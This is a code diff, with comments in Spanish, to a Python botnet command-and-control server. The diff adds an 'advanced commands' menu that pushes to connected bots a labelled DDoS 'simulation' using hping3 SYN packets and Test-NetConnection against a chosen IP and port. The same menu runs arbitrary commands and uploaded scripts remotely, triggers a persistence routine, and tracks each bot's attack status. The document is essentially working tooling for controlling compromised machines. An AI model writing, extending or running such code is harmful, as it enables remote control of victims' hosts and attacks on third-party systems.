@@ -13,6 +13,7 @@ bots = [] # List de bots
 bot_ids = {} # Diccinario con los IDS de los bots
 sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
 respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
+ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot
 server_running = True  # Variable para controlar el estado del servidor
 
 def configurar_logging(config):
@@ -392,120 +393,149 @@ def menu_comandos():
             print("No hay bots conectados.")
             return
 
-        print("\nÓrdenes disponibles:")
-        print("1. Hacer PING a una dirección específica")
-        print("2. Obtener información del sistema")
-        print("3. Listar archivos en el directorio actual")
-        print("4. Ver procesos en ejecución")
-        print("5. Consultar conexiones de red")
-        print("6. Obtener la IP pública")
-        print("7. Ejecutar un comando personalizado")
-        print("8. Ejecutar un script remoto")
-        print("9. Intentar asegurar la persistencia")
-        
-        orden = input("Seleccione una orden: ")
-        comando_windows = ""
-        comando_linux = ""
+        print("\nSeleccione el tipo de comandos:")
+        print("1. Comandos básicos")
+        print("2. Comandos avanzados")
+        tipo_comando = input("Ingrese su opción: ")
 
-        if orden == "1":
-            direccion = input("Ingrese la dirección a hacer PING: ")
-            comando_windows = f"ping {direccion}"
-            comando_linux = f"ping -c 4 {direccion}"
-        elif orden == "2":
-            comando_windows = "systeminfo"
-            comando_linux = "uname -a && lsb_release -a"
-        elif orden == "3":
-            comando_windows = "dir"
-            comando_linux = "ls -lah"
-        elif orden == "4":
-            comando_windows = "tasklist"
-            comando_linux = "ps aux"
-        elif orden == "5":
-            comando_windows = "netstat -ano"
-            comando_linux = "netstat -tunapl"
-        elif orden == "6":
-            comando_windows = "curl ifconfig.me"
-            comando_linux = "curl ifconfig.me"
-        elif orden == "7":
-            comando_windows = input("Ingrese el comando personalizado para Windows: ")
-            comando_linux = input("Ingrese el comando personalizado para Linux: ")
-        elif orden == "8":
-            print("Seleccione el tipo de script:")
-            print("1. Python")
-            print("2. Bash")
-            print("3. Otro (especificar)")
-            
-            tipo = input("Ingrese la opción: ")
+        if tipo_comando == "1":
+            print("\nComandos básicos disponibles:")
+            print("1. Obtener información del sistema")
+            print("2. Consultar conexiones de red")
+            print("3. Ver procesos en ejecución")
+            print("4. Listar archivos en el directorio actual")
+            print("5. Obtener la IP pública")
+            orden = input("Seleccione una orden: ")
+            comando_windows = ""
+            comando_linux = ""
 
-            if tipo == "1":
-                extension = "py"
-                interprete_linux = "python3 -c"
-                interprete_windows = "python -c"
-            elif tipo == "2":
-                extension = "sh"
-                interprete_linux = "bash -c"
-                interprete_windows = "powershell -Command"
-            elif tipo == "3":
-                extension = input("Ingrese la extensión del script (ejemplo: ps1, rb, pl): ")
-                interprete_linux = input("Ingrese el comando para ejecutarlo en Linux: ")
-                interprete_windows = input("Ingrese el comando para ejecutarlo en Windows: ")
+            if orden == "1":
+                comando_windows = "systeminfo"
+                comando_linux = "uname -a && lsb_release -a"
+            elif orden == "2":
+                comando_windows = "netstat -ano"
+                comando_linux = "netstat -tunapl"
+            elif orden == "3":
+                comando_windows = "tasklist"
+                comando_linux = "ps aux"
+            elif orden == "4":
+                comando_windows = "dir"
+                comando_linux = "ls -lah"
+            elif orden == "5":
+                comando_windows = "curl ifconfig.me"
+                comando_linux = "curl ifconfig.me"
             else:
-                print("Opción inválida.")
+                print("Opción no válida.")
                 return
 
-            print("\n¿Cómo desea proporcionar el script?")
-            print("1. Escribirlo aquí")
-            print("2. Proporcionar la ruta de un archivo")
-            
-            metodo = input("Ingrese la opción: ")
+            enviar_comando(comando_windows, comando_linux)
 
-            if metodo == "1":
-                print(f"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:")
-                lineas = []
-                while True:
-                    try:
-                        linea = input()
-                        if linea.strip().upper() == "EOF":  # Detectar EOF
-                            break
-                        lineas.append(linea)
-                    except KeyboardInterrupt:  # Capturar Ctrl+C para salir
-                        print("\nEntrada cancelada.")
-                        return
-                script = "\n".join(lineas)  # Unir líneas en una sola cadena
-            elif metodo == "2":
-                ruta = input("Ingrese la ruta del archivo: ")
-                try:
-                    with open(ruta, "r", encoding="utf-8") as archivo:
-                        script = archivo.read()
-                except Exception as e:
-                    print(f"Error al leer el archivo: {e}")
+        elif tipo_comando == "2":
+            print("\nComandos avanzados disponibles:")
+            print("1. Simular ataque DDoS")
+            print("2. Detener simulación de DDoS")
+            print("3. Ejecutar un comando personalizado")
+            print("4. Ejecutar un script remoto")
+            print("5. Intentar asegurar la persistencia")
+            orden = input("Seleccione una orden: ")
+            comando_windows = ""
+            comando_linux = ""
+
+            if orden == "1":
+                objetivo = input("Ingrese la dirección IP del objetivo: ")
+                puerto = input("Ingrese el puerto del objetivo: ")
+                protocolo = input("Ingrese el protocolo (TCP/UDP): ").upper()
+                if protocolo not in ["TCP", "UDP"]:
+                    print("Protocolo no válido.")
                     return
+                comando_windows = f"powershell -Command \"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\""
+                comando_linux = f"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done"
+                enviar_comando(comando_windows, comando_linux, "ddos_start")
+            elif orden == "2":
+                comando_windows = "stop_ddos"
+                comando_linux = "stop_ddos"
+                enviar_comando(comando_windows, comando_linux, "ddos_stop")
+            elif orden == "3":
+                comando_windows = input("Ingrese el comando personalizado para Windows: ")
+                comando_linux = input("Ingrese el comando personalizado para Linux: ")
+                enviar_comando(comando_windows, comando_linux)
+            elif orden == "4":
+                print("Seleccione el tipo de script:")
+                print("1. Python")
+                print("2. Bash")
+                print("3. Otro (especificar)")
+                
+                tipo = input("Ingrese la opción: ")
+
+                if tipo == "1":
+                    extension = "py"
+                    interprete_linux = "python3 -c"
+                    interprete_windows = "python -c"
+                elif tipo == "2":
+                    extension = "sh"
+                    interprete_linux = "bash -c"
+                    interprete_windows = "powershell -Command"
+                elif tipo == "3":
+                    extension = input("Ingrese la extensión del script (ejemplo: ps1, rb, pl): ")
+                    interprete_linux = input("Ingrese el comando para ejecutarlo en Linux: ")
+                    interprete_windows = input("Ingrese el comando para ejecutarlo en Windows: ")
+                else:
+                    print("Opción inválida.")
+                    return
+
+                print("\n¿Cómo desea proporcionar el script?")
+                print("1. Escribirlo aquí")
+                print("2. Proporcionar la ruta de un archivo")
+                
+                metodo = input("Ingrese la opción: ")
+
+                if metodo == "1":
+                    print(f"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:")
+                    lineas = []
+                    while True:
+                        try:
+                            linea = input()
+                            if linea.strip().upper() == "EOF":  # Detectar EOF
+                                break
+                            lineas.append(linea)
+                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir
+                            print("\nEntrada cancelada.")
+                            return
+                    script = "\n".join(lineas)  # Unir líneas en una sola cadena
+                elif metodo == "2":
+                    ruta = input("Ingrese la ruta del archivo: ")
+                    try:
+                        with open(ruta, "r", encoding="utf-8") as archivo:
+                            script = archivo.read()
+                    except Exception as e:
+                        print(f"Error al leer el archivo: {e}")
+                        return
+                else:
+                    print("Opción inválida.")
+                    return
+
+                # Reemplazar comillas para evitar problemas con la ejecución remota
+                script = script.replace('"', r'\"').replace("'", r"\'")
+
+                comando_windows = f'{interprete_windows} "{script}"'
+                comando_linux = f"{interprete_linux} '{script}'"
+
+                enviar_comando(comando_windows, comando_linux)
+            elif orden == "5":
+                print("\nIntentando asegurar la persistencia en los bots seleccionados...")
+                comando_windows = "persistencia"
+                comando_linux = "persistencia"
+                enviar_comando(comando_windows, comando_linux)
             else:
-                print("Opción inválida.")
+                print("Opción no válida.")
                 return
-
-            # Reemplazar comillas para evitar problemas con la ejecución remota
-            script = script.replace('"', r'\"').replace("'", r"\'")
-
-            comando_windows = f'{interprete_windows} "{script}"'
-            comando_linux = f"{interprete_linux} '{script}'"
-
-            enviar_comando(comando_windows, comando_linux)
-        elif orden == "9":
-            print("\nIntentando asegurar la persistencia en los bots seleccionados...")
-            comando_windows = "persistencia"
-            comando_linux = "persistencia"
-            enviar_comando(comando_windows, comando_linux)
-
         else:
             print("Opción no válida.")
             return
-
-        enviar_comando(comando_windows, comando_linux)
     except Exception as e:
         logging.error(f"Error en el menú de comandos: {e}")
 
-def enviar_comando(comando_windows, comando_linux):
+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):
     
     """
     Envía un comando a un conjunto de bots seleccionados.
@@ -514,6 +544,8 @@ def enviar_comando(comando_windows, comando_linux):
     :type comando_windows: str
     :param comando_linux: El comando a enviar a los bots Linux.
     :type comando_linux: str
+    :param tipo_comando: El tipo de comando a enviar (opcional).
+    :type tipo_comando: str
     """
     try:
         logging.info("Enviando comando a los bots seleccionados")
@@ -568,7 +600,7 @@ def enviar_comando(comando_windows, comando_linux):
         respuestas = {}
 
         for bot in bots_seleccionados:
-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux)
+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)
 
         print("\n--- Respuestas de los bots ---\n")
         for bot, respuesta in respuestas.items():
@@ -580,7 +612,7 @@ def enviar_comando(comando_windows, comando_linux):
     except Exception as e:
         logging.error(f"Error al enviar comando: {e}")
 
-def enviar_comando_a_bot(bot, comando_windows, comando_linux):
+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):
     
     """
     Envía un comando a un bot específico basado en su sistema operativo.
@@ -593,6 +625,8 @@ def enviar_comando_a_bot(bot, comando_windows, comando_linux):
     :param bot: El socket del bot al que se enviará el comando.
     :param comando_windows: El comando a ejecutar si el bot es Windows.
     :param comando_linux: El comando a ejecutar si el bot es Linux.
+    :param tipo_comando: El tipo de comando a enviar (opcional).
+    :type tipo_comando: str
     :return: La respuesta del bot o un mensaje de error si no se recibe 
              respuesta o si el bot se desconecta.
     """
@@ -613,6 +647,10 @@ def enviar_comando_a_bot(bot, comando_windows, comando_linux):
             while time.time() - tiempo_inicial < tiempo_maximo:
                 if bot_id in respuestas_bots:
                     respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta
+                    if tipo_comando == "ddos_start":
+                        ddos_status[bot_id] = "running"
+                    elif tipo_comando == "ddos_stop":
+                        ddos_status[bot_id] = "stopped"
                     print(f"\n--- Respuesta del Bot {bot_id} ---\n{respuesta}\n")
                     return respuesta if respuesta else "[INFO] Comando ejecutado sin salida"
                 time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente
